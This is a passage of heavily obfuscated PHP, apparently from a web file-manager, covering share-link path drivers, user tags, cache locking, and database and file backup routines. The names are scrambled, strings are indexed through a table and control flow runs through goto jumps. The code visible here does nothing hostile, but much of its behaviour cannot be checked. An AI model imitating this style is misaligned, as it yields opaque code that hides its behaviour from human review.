Action($´òÊÇÚ†[1178])->shareItemInfo($“³†®›[$´òÊÇÚ†[86]]); } unset($“³†®›); return $Ú®÷™™¼; } } class PathDriverDriverShareItem { public function __construct($¶Š©«¹Ë) { $this->pathParse = $¶Š©«¹Ë; } public function __call($¡ù²ô³, $…ˆ¾ç—«) { $’‰°×¨Ä =& $_SERVER[Ü©»’·]; if (method_exists($this, $¡ù²ô³)) { return; } $Åñß‡ñ = call_user_func_array(array($’‰°×¨Ä[1349], $¡ù²ô³), $…ˆ¾ç—«); $¸˜½¶õÇ = array($’‰°×¨Ä[1350], $’‰°×¨Ä[1351], $’‰°×¨Ä[1352], $’‰°×¨Ä[1353], $’‰°×¨Ä[564], $’‰°×¨Ä[566], $’‰°×¨Ä[1354], $’‰°×¨Ä[107], $’‰°×¨Ä[1355], $’‰°×¨Ä[1356]); if (in_array($¡ù²ô³, $¸˜½¶õÇ)) { $Åñß‡ñ = $this->getPathOuter($Åñß‡ñ); } return $Åñß‡ñ; } public function copy($ü‡ïçğÉ, $éÌå‚Ù…, $¾ÊÏ±·Í = false, $°¾¸·—Ñ = false) { return $this->copyMove($ü‡ïçğÉ, $éÌå‚Ù…, $¾ÊÏ±·Í, $_SERVER[Ü©»’·][564], $°¾¸·—Ñ); } public function move($€¹º¶éö, $É€¶ê™Ü, $ë‚øÜåâ = false, $ï¸è¸ÜÆ = false) { return $this->copyMove($€¹º¶éö, $É€¶ê™Ü, $ë‚øÜåâ, $_SERVER[Ü©»’·][566], $ï¸è¸ÜÆ); } private function copyMove($Ñúµ˜‡´, $ş­Ûó—, $˜¸Í§ïÈ, $§¯ ³¹œ, $¯°ò×‘ = false) { $µê„¨³† =& $_SERVER[Ü©»’·]; $œ—­¼Íé = $ş­Ûó—; $¨ïéÊš© = IO::driverMake($ş­Ûó—); if ($¨ïéÊš©->pathParse[$µê„¨³†[1154]]) { $ş­Ûó— = $¨ïéÊš©->pathParse[$µê„¨³†[1154]]; } else { $ş­Ûó— = $œ—­¼Íé; } $–³Í†« = IO::copyMove($Ñúµ˜‡´, $ş­Ûó—, $˜¸Í§ïÈ, $§¯ ³¹œ, $¯°ò×‘); $–³Í†« = $this->getPathOuter($–³Í†«); return $–³Í†«; } public function pathThis($¨Œâß¯æ) { return get_path_this($this->pathParse[$_SERVER[Ü©»’·][84]]); } public function pathFather($ŸÉ˜™Â‰) { return get_path_father($this->pathParse[$_SERVER[Ü©»’·][84]]); } public function iconvSystem($î™†°ôà) { return $î™†°ôà; } protected function infoParse($ª¹éàÀ®, $¢øä­âÙ = false) { $¼¬Œ²ûä =& $_SERVER[Ü©»’·]; $áµîßÆŒ = $this->pathParse[$¼¬Œ²ûä[496]][$¼¬Œ²ûä[1179]] . $this->pathParse[$¼¬Œ²ûä[1172]]; if ($¢øä­âÙ) { $Ç°§›ÕĞ = IO::infoWithChildren($áµîßÆŒ); } else { $Ç°§›ÕĞ = IO::info($áµîßÆŒ); } $½„„¼ßö = $this->pathParse[$¼¬Œ²ûä[496]]; return Action($¼¬Œ²ûä[1347])->_shareItemeParse($Ç°§›ÕĞ, $½„„¼ßö); } public function listAll($­‡Âûé‡) { $¹Èå½˜à =& $_SERVER[Ü©»’·]; $†¸—ÈÍÙ = IO::listAll($­‡Âûé‡); $Ç§İ¡Ë = $this->pathParse[$¹Èå½˜à[496]]; foreach ($†¸—ÈÍÙ as &$Šëáç­Ú) { check_abort(); $û¿†ù·ó = IO::info($Šëáç­Ú[$¹Èå½˜à[84]]); $û¿†ù·ó = is_array($û¿†ù·ó) ? $û¿†ù·ó : array(); $Šëáç­Ú = array_merge($û¿†ù·ó, $Šëáç­Ú); $Šëáç­Ú[$¹Èå½˜à[86]] = Action($¹Èå½˜à[1347])->_shareItemeParse($Šëáç­Ú, $Ç§İ¡Ë); } unset($Šëáç­Ú); return $†¸—ÈÍÙ; } public function getPathOuter($œç»Üã•) { $òßÆ°½‹ =& $_SERVER[Ü©»’·]; $½à¸‘­ñ = KodIO::parse($œç»Üã•); if ($½à¸‘­ñ[$òßÆ°½‹[33]] == KodIO::KOD_SHARE_ITEM) { return $½à¸‘­ñ[$òßÆ°½‹[84]]; } $¼Ó˜ô‹Ç = KodIO::clear($œç»Üã•); $ˆ©ßêø = KodIO::clear($this->pathParse[$òßÆ°½‹[496]][$òßÆ°½‹[1179]]); $¬¾à½ = substr($¼Ó˜ô‹Ç, strlen($ˆ©ßêø)); if (substr($¼Ó˜ô‹Ç, 0, strlen($ˆ©ßêø)) != $ˆ©ßêø) { return !1; } return $this->pathParse[$òßÆ°½‹[1173]] . $òßÆ°½‹[8] . ltrim($¬¾à½, $òßÆ°½‹[8]); } public function getType() { $•¯‹–¾« =& $_SERVER[Ü©»’·]; $£‰âğÍ€ = str_replace($•¯‹–¾«[74], $•¯‹–¾«[12], get_class($this)); return strtolower($£‰âğÍ€); } public function isTypeObject($ÇÂ×ı) { return IO::isTypeObject($ÇÂ×ı); } public function info($Ä€Ó¹«) { return $this->infoParse($Ä€Ó¹«); } public function infoAuth($Ìì˜¾õŞ) { return $this->infoParse($Ìì˜¾õŞ); } public function infoWithChildren($³ô‰ç¼) { return $this->infoParse($³ô‰ç¼, !0); } public function infoFull($°ü÷†ÉÎ) { return $this->infoParse($°ü÷†ÉÎ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ã·Ò£‰Ê) { $this->pathParse = $ã·Ò£‰Ê; } protected function infoParse($ª×Ó—Ìı, $Ì–†¶ì = false) { $†‹æèğô =& $_SERVER[Ü©»’·]; return Action($†‹æèğô[1178])->sharePathInfo($this->pathParse[$†‹æèğô[84]], !0, $Ì–†¶ì); } public function listPath($Ü•™Ö”Ğ, $ˆ†²ƒãÌ = false) { $öˆ¹Åâ„ =& $_SERVER[Ü©»’·]; $ˆúŞÂì’ = IO::listPath($Ü•™Ö”Ğ, $ˆ†²ƒãÌ); if (!$ˆúŞÂì’) { return $ˆúŞÂì’; } if (is_array($ˆúŞÂì’[$öˆ¹Åâ„[1348]])) { $öŞ‚üÈà = Action($öˆ¹Åâ„[1357])->parsePathChildren($ˆúŞÂì’[$öˆ¹Åâ„[1348]], array($öˆ¹Åâ„[430] => $Ü•™Ö”Ğ)); $ˆúŞÂì’[$öˆ¹Åâ„[1348]] = Action($öˆ¹Åâ„[1178])->shareItemInfo($öŞ‚üÈà); } foreach ($ˆúŞÂì’ as $€šÈó«Å => $¹ìñ…Ô“) { if (!in_array($€šÈó«Å, array($öˆ¹Åâ„[83], $öˆ¹Åâ„[82]))) { continue; } foreach ($¹ìñ…Ô“ as $˜ÔÇ·ŸĞ => $öŞ‚üÈà) { $öŞ‚üÈà = Action($öˆ¹Åâ„[1357])->parsePathChildren($öŞ‚üÈà, array($öˆ¹Åâ„[430] => $Ü•™Ö”Ğ)); $ˆúŞÂì’[$€šÈó«Å][$˜ÔÇ·ŸĞ] = Action($öˆ¹Åâ„[1178])->shareItemInfo($öŞ‚üÈà); } } return $ˆúŞÂì’; } public function listAll($”á¨¦Äƒ) { $¼Üê·“¦ =& $_SERVER[Ü©»’·]; $îï”àª× = IO::listAll($”á¨¦Äƒ); foreach ($îï”àª× as &$Â™¨Œ¨ˆ) { $„ùÚ† = IO::info($Â™¨Œ¨ˆ[$¼Üê·“¦[84]]); $„ùÚ† = is_array($„ùÚ†) ? $„ùÚ† : array(); $Â™¨Œ¨ˆ = array_merge($„ùÚ†, $Â™¨Œ¨ˆ); $Â™¨Œ¨ˆ[$¼Üê·“¦[86]] = Action($¼Üê·“¦[1178])->shareItemInfo($Â™¨Œ¨ˆ); } unset($Â™¨Œ¨ˆ); return $îï”àª×; } } goto a²Ş·ÑØÒÇ; fˆƒœçËÑ‘: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\164\x61\147\114\151\163\164"; public $modelType = "\x55\163\x65\x72\x4f\160\x74\151\x6f\156"; public $field = array("\156\141\x6d\145", "\163\x74\x79\154\145", "\x73\x6f\x72\164"); public function listData($ÖÈ—Â÷œ = false, $†»©¨â” = "\163\x6f\x72\x74", $¦¶¸Ä•Ã = false) { return parent::listData($ÖÈ—Â÷œ, $†»©¨â”, $¦¶¸Ä•Ã); } public function remove($şÏ¤„¸×) { return parent::remove($şÏ¤„¸×); } public function add($„¶Ï–ê, $æ‹†›³ó = "\154\141\142\145\x6c\x2d\x67\162\145\171\55\156\157\x72\x6d\141\x6c") { $ÖÉÎÆªÀ =& $_SERVER[Ü©»’·]; if ($this->findByName($„¶Ï–ê)) { return !1; } $²ÑÃô·ı = array($ÖÉÎÆªÀ[429] => $„¶Ï–ê, $ÖÉÎÆªÀ[494] => $æ‹†›³ó, $ÖÉÎÆªÀ[1862] => $this->getSort($ÖÉÎÆªÀ[258]) + 1); return parent::insert($²ÑÃô·ı); } public function update($¥ÌğƒİÂ, $‰Ö½ºşê) { $îÇíÚ¹‰ =& $_SERVER[Ü©»’·]; $ÏÌè«€Õ = $this->listData($¥ÌğƒİÂ); $Æ«“â¾Á = $this->findByName($‰Ö½ºşê[$îÇíÚ¹‰[32]]); if (!$ÏÌè«€Õ || $Æ«“â¾Á && $Æ«“â¾Á[$îÇíÚ¹‰[408]] != $ÏÌè«€Õ[$îÇíÚ¹‰[408]]) { return !1; } return parent::update($¥ÌğƒİÂ, $‰Ö½ºşê); } public function moveTop($úøŸ”íØ) { $×ñ—çö =& $_SERVER[Ü©»’·]; $¸åØ©è“ = parent::listData(); $Êªã£…Á = $this->getSort($×ñ—çö[257]); foreach ($¸åØ©è“ as &$„‚êô) { if ($„‚êô[$×ñ—çö[408]] == $úøŸ”íØ) { $„‚êô[$×ñ—çö[1882]] = $Êªã£…Á; continue; } $„‚êô[$×ñ—çö[1882]] += 1; } unset($„‚êô); return parent::resetData($¸åØ©è“); } public function moveBottom($ç„Ø‹åæ) { $º¸³Ş˜Ù =& $_SERVER[Ü©»’·]; $Î©˜Âş = $this->getSort($º¸³Ş˜Ù[258]) + 1; return parent::update($ç„Ø‹åæ, array($º¸³Ş˜Ù[1882] => $Î©˜Âş)); } public function resetSort($çäú½¹Ñ) { $¼õö‘È× =& $_SERVER[Ü©»’·]; $Òî€¶ïÚ = array(); $çäú½¹Ñ = is_array($çäú½¹Ñ) ? $çäú½¹Ñ : array(); for ($®ÜÆ¨ãÚ = 0; $®ÜÆ¨ãÚ < count($çäú½¹Ñ); $®ÜÆ¨ãÚ++) { $Òî€¶ïÚ[$çäú½¹Ñ[$®ÜÆ¨ãÚ] . $¼õö‘È×[12]] = $®ÜÆ¨ãÚ + 1; } $î½’¡åˆ = parent::listData(); foreach ($î½’¡åˆ as &$œÑÇ”´³) { $à£å“Û† = $Òî€¶ïÚ[$œÑÇ”´³[$¼õö‘È×[408]]]; $œÑÇ”´³[$¼õö‘È×[1882]] = $à£å“Û† ? $à£å“Û† : $œÑÇ”´³[$¼õö‘È×[1882]]; } unset($œÑÇ”´³); return parent::resetData($î½’¡åˆ); } private function getSort($‰ÖÛ•ù) { $Ìƒ¤«‡± =& $_SERVER[Ü©»’·]; $²øº‰ÖÄ = parent::listData(); $Ôå‡š§œ = array_to_keyvalue($²øº‰ÖÄ, $Ìƒ¤«‡±[12], $Ìƒ¤«‡±[1882]); if (!$Ôå‡š§œ) { $Ôå‡š§œ = array(0); } $¥Ñ¯¡¨± = $‰ÖÛ•ù == $Ìƒ¤«‡±[258] ? max($Ôå‡š§œ) : min($Ôå‡š§œ); return intval($¥Ñ¯¡¨±); } } goto d×èÅŠˆ’Â; cŠ†¦£‘„Ø: define($_SERVER[Ü©»’·][621], $_SERVER[Ü©»’·][622]); $wgrdxtsfjo = $_SERVER[Ü©»’·][623]; if (!$wgrdxtsfjo) { die; } goto d´„ïÇ–à¦; dÕš¶‹İêß: define($_SERVER[Ü©»’·][238], 1); define($_SERVER[Ü©»’·][239], 2); define($_SERVER[Ü©»’·][240], 3); goto FÓŞ¢ß¬‡; bÒ’®Ü£: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $õÏ“¼†¸ =& $_SERVER[Ü©»’·]; $¼Ö‹¿È = $GLOBALS[$õÏ“¼†¸[6]][$õÏ“¼†¸[349]]; self::$cachePath = $¼Ö‹¿È[$õÏ“¼†¸[199]][$õÏ“¼†¸[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¡ıŒüõ£, $ïé¨­Ò = 0) { $–û¢ÚºØ =& $_SERVER[Ü©»’·]; $Æòşëó = microtime(!0); $ˆÜÍ€å = $Æòşëó + $ïé¨­Ò + 0.0001; $Ú’Íä…ì = rtrim(self::$cachePath, $–û¢ÚºØ[8]) . $–û¢ÚºØ[869] . md5($¡ıŒüõ£) . $–û¢ÚºØ[866]; if (file_exists($Ú’Íä…ì) && filemtime($Ú’Íä…ì) && filemtime($Ú’Íä…ì) < time() - 10) { @unlink($Ú’Íä…ì); } do { if (file_exists($Ú’Íä…ì)) { cacheLockWait(); continue; } $âÏ¤¿Ûà = fopen($Ú’Íä…ì, $–û¢ÚºØ[870]); if (!$âÏ¤¿Ûà) { return !1; } $²´Ï½Û± = flock($âÏ¤¿Ûà, LOCK_EX | LOCK_NB); self::$caches[$¡ıŒüõ£] = array($–û¢ÚºØ[871] => $âÏ¤¿Ûà, $–û¢ÚºØ[199] => $Ú’Íä…ì); fwrite($âÏ¤¿Ûà, $ˆÜÍ€å); clearstatcache(); if ($âÏ¤¿Ûà && $²´Ï½Û±) { return !0; } cacheLockWait(); } while (microtime(!0) < $ˆÜÍ€å); $this->unlock($¡ıŒüõ£); return !1; } public function lockGet($äİ‘œåÅ) { $ÉÕİ©Ü† =& $_SERVER[Ü©»’·]; $šµ—…Ç = rtrim(self::$cachePath, $ÉÕİ©Ü†[8]) . $ÉÕİ©Ü†[869] . md5($äİ‘œåÅ) . $ÉÕİ©Ü†[866]; return file_exists($šµ—…Ç); } public function unlock($ÇŸ´ğë¹) { $’ÑÏšşé =& $_SERVER[Ü©»’·]; $ßÆáØøÔ = self::$caches[$ÇŸ´ğë¹]; if (!$ßÆáØøÔ) { return; } @flock($ßÆáØøÔ[$’ÑÏšşé[871]], LOCK_UN); @fclose($ßÆáØøÔ[$’ÑÏšşé[871]]); @unlink($ßÆáØøÔ[$’ÑÏšşé[199]]); unset(self::$caches[$ÇŸ´ğë¹]); } } class CacheLockRedis { public function lock($º¹—Ü‘–, $áõ²ğ = 10) { $¾ìÓ¨‡ = Cache::init(); $¦åœØÅï = microtime(!0) + $áõ²ğ; while (microtime(!0) < $¦åœØÅï) { $À‘²Ãº = $¾ìÓ¨‡->get($º¹—Ü‘–); if (!$À‘²Ãº) { $´áœ‘ƒ = $¾ìÓ¨‡->setLock($º¹—Ü‘–, $¦åœØÅï, $áõ²ğ); if ($´áœ‘ƒ) { return !0; } } else { if ($À‘²Ãº < microtime(!0)) { $¾ìÓ¨‡->set($º¹—Ü‘–, $¦åœØÅï, $áõ²ğ * 2); if ($¾ìÓ¨‡->get($º¹—Ü‘–) === $À‘²Ãº) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($óãğ€) { return Cache::init()->get($óãğ€); } public function unlock($ë•Üò…) { return Cache::init()->remove($ë•Üò…); } } class CacheLockMemcached { public function lock($ÁËÌ¡…Ù, $ê™§šö© = 0) { $¡ş€†â = Cache::init(); $œªÒº÷  = microtime(!0) + $ê™§šö©; while (microtime(!0) < $œªÒº÷ ) { $İçøÀ¶» = $¡ş€†â->get($ÁËÌ¡…Ù); if (!$İçøÀ¶» || $İçøÀ¶» < microtime(!0)) { $€§»™çÃ = $¡ş€†â->handle->add($ÁËÌ¡…Ù, $œªÒº÷ , $ê™§šö©); if ($€§»™çÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‡Êëô¾‰) { return Cache::init()->get($‡Êëô¾‰); } public function unlock($æôÙ­ §) { return Cache::init()->remove($æôÙ­ §); } } goto a®áø„¢ƒˆ; AçŠÊ¾¡œ: class BackupDbFile { public function __construct() { } public function index() { $Ş¥§•ıÜ =& $_SERVER[Ü©»’·]; $È¹Æ½éç = Backup::get(); $ñ¾ Ö‘„ = $È¹Æ½éç[$Ş¥§•ıÜ[32]]; $’Ñ²ª„ = $this->tmpFilesPath() . "\142\x61\x63\153\165\160\137{$ñ¾ Ö‘„}\x2f"; $Î’ä†µ = $this->backupPath($È¹Æ½éç); if (!($Î’ä†µ = IO::mkdir($Î’ä†µ))) { return !1; } $´¸ªêô = IO::listPath($’Ñ²ª„); $³Öñ×ìß = isset($´¸ªêô[$Ş¥§•ıÜ[83]]) ? $´¸ªêô[$Ş¥§•ıÜ[83]] : array(); $¸Îıêá¦ = array_sum(array_column($³Öñ×ìß, $Ş¥§•ıÜ[76])); if (!$¸Îıêá¦) { return !1; } $±“Í¡ß = array($Ş¥§•ıÜ[804] => $¸Îıêá¦, $Ş¥§•ıÜ[805] => time()); Backup::set($±“Í¡ß); $õ›¾¹¡ = new TaskFileTransfer($Ş¥§•ıÜ[806], $Ş¥§•ıÜ[786], count($³Öñ×ìß), LNG($Ş¥§•ıÜ[787]) . $Ş¥§•ıÜ[395] . LNG($Ş¥§•ıÜ[789]) . $Ş¥§•ıÜ[807]); $õ›¾¹¡->task[$Ş¥§•ıÜ[769]] = $¸Îıêá¦; foreach ($´¸ªêô[$Ş¥§•ıÜ[83]] as $æ°ƒ¹³) { $Ù ÔèÖ = IO::move($æ°ƒ¹³[$Ş¥§•ıÜ[84]], $Î’ä†µ); if (!$Ù ÔèÖ) { $õ›¾¹¡->end(); $ –œ’‚ş = IO::getLastError($Ş¥§•ıÜ[808] . $æ°ƒ¹³[$Ş¥§•ıÜ[84]] . $Ş¥§•ıÜ[809] . $Î’ä†µ . $Ş¥§•ıÜ[164]); write_log($ –œ’‚ş, $Ş¥§•ıÜ[786]); return !1; } } $•©´í´ = new DbManage(); $ÀÜëóØ = $•©´í´->getSqlFile(); if (!$ÀÜëóØ[$Ş¥§•ıÜ[810]] || !$ÀÜëóØ[$Ş¥§•ıÜ[13]]) { return !1; } IO::move($ÀÜëóØ[$Ş¥§•ıÜ[810]], $Î’ä†µ); IO::move($ÀÜëóØ[$Ş¥§•ıÜ[13]], $Î’ä†µ); $õ›¾¹¡->end(); $±“Í¡ß = array($Ş¥§•ıÜ[811] => $¸Îıêá¦, $Ş¥§•ıÜ[812] => time()); Backup::set($±“Í¡ß); return !0; } private function backupPath($™÷ëóö¢) { $ªº³ÁÍ² =& $_SERVER[Ü©»’·]; $…’ÕóÆá = $™÷ëóö¢[$ªº³ÁÍ²[32]]; $¦‰¥ß¦ı = Model($ªº³ÁÍ²[776])->get($ªº³ÁÍ²[777]); $çÚ˜Å±ò = substr(md5($ªº³ÁÍ²[778] . $¦‰¥ß¦ı . $…’ÕóÆá), 0, 8); return "\x7b\151\157\x3a{$™÷ëóö¢[$ªº³ÁÍ²[758]]}\175\57\x64\141\164\x61\x62\141\x73\x65\57\x62\141\x63\153\165\x70\57" . $…’ÕóÆá . $ªº³ÁÍ²[11] . $çÚ˜Å±ò; } private function tmpFilesPath() { $¶ºù®‚Ñ =& $_SERVER[Ü©»’·]; $øè…®•² = TEMP_FILES; if ($GLOBALS[$¶ºù®‚Ñ[6]][$¶ºù®‚Ñ[89]][$¶ºù®‚Ñ[802]]) { $øè…®•² = $GLOBALS[$¶ºù®‚Ñ[6]][$¶ºù®‚Ñ[89]][$¶ºù®‚Ñ[802]]; if (!mk_dir($øè…®•²) || !is_writable($øè…®•²) || !IO::mkfile($øè…®•² . $¶ºù®‚Ñ[803])) { $øè…®•² = TEMP_FILES; } } return $øè…®•²; } } class BackupFile { public function __construct() { } public function index() { $²ş˜°¿ = Backup::get(); $ •¤õ› = $²ş˜°¿[$_SERVER[Ü©»’·][293]][$_SERVER[Ü©»’·][199]][$_SERVER[Ü©»’·][477]]; $™°ñŸóœ = array($_SERVER[Ü©»’·][478] => array($_SERVER[Ü©»’·][813], $ •¤õ›), $_SERVER[Ü©»’·][814] => array($_SERVER[Ü©»’·][331], $²ş˜°¿[$_SERVER[Ü©»’·][758]])); $Îœ¸ßÃ¡ = (int) Model($_SERVER[Ü©»’·][795])->where($™°ñŸóœ)->count($_SERVER[Ü©»’·][477]); $Äº‘ê›¬ = (int) Model($_SERVER[Ü©»’·][795])->where($™°ñŸóœ)->sum($_SERVER[Ü©»’·][76]); $Õ²¦®º = new TaskFileTransfer($_SERVER[Ü©»’·][815], $_SERVER[Ü©»’·][786], $Îœ¸ßÃ¡, LNG($_SERVER[Ü©»’·][787]) . $_SERVER[Ü©»’·][788] . LNG($_SERVER[Ü©»’·][816])); $Õ²¦®º->task[$_SERVER[Ü©»’·][769]] = $Äº‘ê›¬; $…ÁßÖƒø = array($_SERVER[Ü©»’·][817] => $Îœ¸ßÃ¡, $_SERVER[Ü©»’·][818] => $Äº‘ê›¬, $_SERVER[Ü©»’·][819] => time()); Backup::set($…ÁßÖƒø); $š¯õ¸÷Ô = !0; $ˆ† õ” = $this->storeIds(); $õäêÅ¤ = 1; $é¾ÔÙŸ = 1000; $ÇãÚ¹ = $ô£Ş™ãÎ = 0; $ß®àŞÑï = array(); $ÜüºŞç = $ú´‘™ = 0; do { $âúšõæ = $_SERVER[Ü©»’·][820]; $¶¨“Œå× = Model($_SERVER[Ü©»’·][795])->where($™°ñŸóœ)->field($âúšõæ)->order($_SERVER[Ü©»’·][821])->selectPage($é¾ÔÙŸ, $õäêÅ¤); $õ¢êêÑó = !empty($¶¨“Œå×[$_SERVER[Ü©»’·][378]]) ? $¶¨“Œå×[$_SERVER[Ü©»’·][378]] : array(); foreach ($õ¢êêÑó as $ØÏ¤«Â¼) { if (!$this->_fileExist($ØÏ¤«Â¼, $ß®àŞÑï, $ˆ† õ”)) { $Îœ¸ßÃ¡ -= 1; $Äº‘ê›¬ -= (int) $ØÏ¤«Â¼[$_SERVER[Ü©»’·][76]]; write_log("\x66\x69\x6c\145\40\156\157\164\40\145\x78\x69\163\164\56\146\x69\154\145\111\x44\72{$ØÏ¤«Â¼[$_SERVER[Ü©»’·][477]]}\54\40\160\x61\164\150\72{$ØÏ¤«Â¼[$_SERVER[Ü©»’·][84]]}", $_SERVER[Ü©»’·][822]); continue; } $ÆÍÆŒÀ = $ØÏ¤«Â¼[$_SERVER[Ü©»’·][84]]; $¼èœµÚ² = "\x7b\151\157\x3a{$²ş˜°¿[$_SERVER[Ü©»’·][758]]}\x7d" . substr($ÆÍÆŒÀ, strlen("\173\x69\157\x3a{$ØÏ¤«Â¼[$_SERVER[Ü©»’·][823]]}\x7d")); if (IO::exist($¼èœµÚ²)) { $Õ²¦®º->updateFileEnd($ØÏ¤«Â¼[$_SERVER[Ü©»’·][32]], $ØÏ¤«Â¼[$_SERVER[Ü©»’·][76]]); } else { $¼èœµÚ² = get_path_father($¼èœµÚ²); IO::mkdir($¼èœµÚ²); if (!IO::copy($ÆÍÆŒÀ, $¼èœµÚ², $_SERVER[Ü©»’·][824])) { write_log($_SERVER[Ü©»’·][825] . $ÆÍÆŒÀ . $_SERVER[Ü©»’·][809] . $¼èœµÚ² . $_SERVER[Ü©»’·][164], $_SERVER[Ü©»’·][786]); $š¯õ¸÷Ô = !1; break; } } $ •¤õ› = $ØÏ¤«Â¼[$_SERVER[Ü©»’·][477]]; $ô£Ş™ãÎ += 1; $ÇãÚ¹ += $ØÏ¤«Â¼[$_SERVER[Ü©»’·][76]]; $ú´‘™ += 1; $ÜüºŞç += $ØÏ¤«Â¼[$_SERVER[Ü©»’·][76]]; if ($ÇãÚ¹ >= 1024 * 1024 * 100) { $…ÁßÖƒø = array($_SERVER[Ü©»’·][826] => $ •¤õ›, $_SERVER[Ü©»’·][827] => $ú´‘™, $_SERVER[Ü©»’·][828] => $ÜüºŞç); Backup::set($…ÁßÖƒø); $ÇãÚ¹ = $ô£Ş™ãÎ = 0; } } $„Ü’û¿Ó = count($õ¢êêÑó); $õäêÅ¤++; } while ($„Ü’û¿Ó == $é¾ÔÙŸ); $Õ²¦®º->end(); $…ÁßÖƒø = array($_SERVER[Ü©»’·][829] => 1, $_SERVER[Ü©»’·][506] => time(), $_SERVER[Ü©»’·][781] => 1, $_SERVER[Ü©»’·][826] => $ •¤õ›, $_SERVER[Ü©»’·][818] => $Äº‘ê›¬, $_SERVER[Ü©»’·][817] => $Îœ¸ßÃ¡, $_SERVER[Ü©»’·][830] => time()); if ($ô£Ş™ãÎ) { $…ÁßÖƒø[$_SERVER[Ü©»’·][827]] = $ú´‘™; $…ÁßÖƒø[$_SERVER[Ü©»’·][828]] = $ÜüºŞç; } Backup::set($…ÁßÖƒø); $this->_fileFilter($ß®àŞÑï); return !0; } private function _fileExist($°Ï»ò™, &$Õ–îÂ³², $ÎŒÃïá¯) { $ó§à”Ë =& $_SERVER[Ü©»’·]; $¨­Ğì ã = $°Ï»ò™[$ó§à”Ë[84]]; if (in_array($°Ï»ò™[$ó§à”Ë[477]], $Õ–îÂ³²)) { return !1; } if (!in_array($°Ï»ò™[$ó§à”Ë[823]], $ÎŒÃïá¯)) { return !1; } if (IO::exist($¨­Ğì ã)) { return !0; } $’Œ—­¹ò = get_path_father($¨­Ğì ã); if (IO::exist($’Œ—­¹ò)) { $Õ–îÂ³²[] = $°Ï»ò™[$ó§à”Ë[477]]; return !1; } $½ßÒøŸ = array($ó§à”Ë[823] => $°Ï»ò™[$ó§à”Ë[823]], $ó§à”Ë[84] => array($ó§à”Ë[392], "{$’Œ—­¹ò}\45")); $ûÏ‡ğ¤ = Model($ó§à”Ë[795])->where($½ßÒøŸ)->field($ó§à”Ë[478])->select(); $Õ–îÂ³² = array_merge($Õ–îÂ³², array_to_keyvalue($ûÏ‡ğ¤, $ó§à”Ë[12], $ó§à”Ë[477])); return !1; } private function _fileFilter($èµŞÍÏ—) { $ıĞ¸´üà =& $_SERVER[Ü©»’·]; if (empty($èµŞÍÏ—)) { return; } $­¯ì±ˆ´ = array($ıĞ¸´üà[477] => array($ıĞ¸´üà[7], array_unique($èµŞÍÏ—))); $Ø‹ßöæÑ = Model($ıĞ¸´üà[831])->where($­¯ì±ˆ´)->field($ıĞ¸´üà[411])->select(); foreach ($Ø‹ßöæÑ as $ìÜ¥ª³¡) { Model($ıĞ¸´üà[831])->remove($ìÜ¥ª³¡[$ıĞ¸´üà[411]], !1); } } private function storeIds() { $ó£‰ø‹• =& $_SERVER[Ü©»’·]; $¤Ïø£¹Ê = Model($ó£‰ø‹•[773])->listData(); $§öÜø°¢ = array(); $û™‚÷âû = $GLOBALS[$ó£‰ø‹•[6]][$ó£‰ø‹•[89]][$ó£‰ø‹•[832]]; foreach ($¤Ïø£¹Ê as $·¼Á¹Û®) { $³Ò»‹Á¨ = strtolower($·¼Á¹Û®[$ó£‰ø‹•[95]]); if (!isset($û™‚÷âû[$³Ò»‹Á¨])) { continue; } $¢•İÊ–ã = $ó£‰ø‹•[74] . (isset($û™‚÷âû[$³Ò»‹Á¨]) ? $û™‚÷âû[$³Ò»‹Á¨] : ucfirst($³Ò»‹Á¨)); if (!class_exists($¢•İÊ–ã)) { continue; } $§öÜø°¢[] = $·¼Á¹Û®[$ó£‰ø‹•[408]]; } return $§öÜø°¢; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $õÌ‚â =& $_SERVER[Ü©»’·]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ˆîÈ•î¦ = $GLOBALS[$õÌ‚â[6]][$õÌ‚â[349]]; $ãÖ¨÷ÔÆ = $ˆîÈ•î¦[$ˆîÈ•î¦[$õÌ‚â[833]]]; $é®êèÙÓ = $ˆîÈ•î¦[$õÌ‚â[834]]; switch ($ˆîÈ•î¦[$õÌ‚â[833]]) { case $õÌ‚â[21]: self::$handle = Model($õÌ‚â[835]); break; case $õÌ‚â[836]: self::$handle = new CacheRedis($ãÖ¨÷ÔÆ, $é®êèÙÓ); break; case $õÌ‚â[837]: self::$handle = new CacheMemcached($ãÖ¨÷ÔÆ, $é®êèÙÓ); break; case $õÌ‚â[199]: self::$handle = new CacheFile($ãÖ¨÷ÔÆ, $é®êèÙÓ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($áÕí˜ç§) { if (is_array($áÕí˜ç§) || is_object($áÕí˜ç§)) { $áÕí˜ç§ = json_encode($áÕí˜ç§); } $áÕí˜ç§ = rawurlencode($áÕí˜ç§); return md5(KOD_SITE_ID . $_SERVER[Ü©»’·][11] . $áÕí˜ç§); } public static function get($ÃÔ»˜, $ˆõ—Áâ„ = false) { $Ïö ‹© = self::key($ÃÔ»˜); if ($ˆõ—Áâ„) { return unserialize(self::init()->get($Ïö ‹©)); } if (!isset(self::$memoryCache[$Ïö ‹©])) { $Â’»Ç¿ = self::init()->get($Ïö ‹©); self::$memoryCache[$Ïö ‹©] = unserialize($Â’»Ç¿); } return self::$memoryCache[$Ïö ‹©]; } public static function set($ìÑ³­ĞÔ, $¤Ë„è—, $›ÀŠ“Ç = false) { $£Óà³ø¥ = self::key($ìÑ³­ĞÔ); if (isset(self::$memoryCache[$£Óà³ø¥]) && self::$memoryCache[$£Óà³ø¥] === $¤Ë„è—) { return !0; } if ($›ÀŠ“Ç === 0) { self::$memoryCache[$£Óà³ø¥] = $¤Ë„è—; return !0; } CacheLock::lock($ìÑ³­ĞÔ); $½÷ÒÄÖ = self::init()->set($£Óà³ø¥, serialize($¤Ë„è—), $›ÀŠ“Ç); self::$memoryCache[$£Óà³ø¥] = $¤Ë„è—; CacheLock::unlock($ìÑ³­ĞÔ); return $½÷ÒÄÖ; } public static function getCall($Ö¶ã½İ, $Èí¹”ãÃ, $³¿µ¢±Ì, $ÔŠ”Ş²É = array()) { $‘úë×àƒ =& $_SERVER[Ü©»’·]; 